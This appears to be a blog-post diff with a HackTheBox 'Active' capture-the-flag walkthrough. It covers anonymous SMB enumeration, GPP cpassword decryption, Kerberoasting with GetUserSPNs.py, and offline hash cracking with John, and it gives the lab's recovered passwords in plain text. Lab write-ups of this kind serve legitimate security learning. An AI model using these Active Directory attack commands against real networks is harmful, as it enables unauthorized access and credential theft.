@@ -1,0 +1,108 @@
+---
+layout: post
+title: Active
+date: 2025-07-15 00:34:00 +0800
+categories: [HackTheBox, Easy]
+tags: [Vulnerability Assessment, Enterprise Network, Default Credentials, Weak Permissions]
+author: klein
+image:
+  path: /images/images-active/image_10.png
+  
+---
+
+Lately, I've found Guided Mode to be really useful when solving retired boxes on HackTheBox. This time I am going to do the same and walk through the box in this Guided manner.
+
+###### How many SMB shares are shared by the target?
+
+I used Netexec to find the answer to this question. To save time, I also saved the target IP as a variable that I can use to move more quickly.
+
+```bash
+nxc smb $IP --shares -u '' -p ''
+```
+
+![b](/images/images-active/image_01.png)
+
+
+To answer this question let's run an Nmap scan.
+
+
+###### What is the name of the share that allows anonymous read access?
+
+This can be answered based on the previous command output.
+
+
+###### Which file has encrypted account credentials in it?
+
+Let's connect to the SMB share.
+
+```bash
+smbclient //$IP/Replication
+```
+
+By enumerating the share (there was a lot to enumerate) I found many files. By reviewing them one by one, I discovered that the Groups.xml file holds the encrypted account credentials.
+
+![b](/images/images-active/image_02.png)
+
+###### What is the decrypted password for the SVC_TGS account?
+
+By doing a little bit of thinking, I found out that this is the historically famous cpassword string, which is obfuscated using a known static AES key. There is a tool to decrypt it, named gpp-decrypt.
+
+```bash
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
+###### Submit the flag located on the security user's desktop.
+
+![b](/images/images-active/image_03.png)
+
+Now that we have a set of credentials at the time of writing two quick options come to my mind immediately: 
+
+- Pass Attacks
+- Dumping credentials remotely using the tool Secretsdump.
+
+```bash
+nxc smb $IP -u SVC_TGS -p 'GPPstillStandingStrong2k18' 
+```
+
+![b](/images/images-active/image_05.png)
+
+I connected to the user's share and got the first flag.
+
+
+```bash
+smbclient -U 'SVC_TGS' //$IP/Users  
+```
+
+![b](/images/images-active/image_06.png)
+
+###### Which service account on Active is vulnerable to Kerberoasting?
+
+Do not forget to add the domain name to the hosts (from the Nmap scan) file in order for the next command to work.
+
+```bash
+sudo GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip $IP -request
+```
+
+![b](/images/images-active/image_07.png)
+
+
+###### What is the plaintext password for the administrator account?
+
+Copied the hash to a text file and used John The Ripper to crack the hash.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+![b](/images/images-active/image_08.png)
+
+Let's use a Pass the Password attack.
+
+```bash
+nxc smb $IP -u Administrator -p 'Ticketmaster1968' --shares
+```
+
+Successfully Pwn3d! 
+
+![b](/images/images-active/image_09.png)
+
+The only thing left to do would be to connect via SMB and get the root flag.
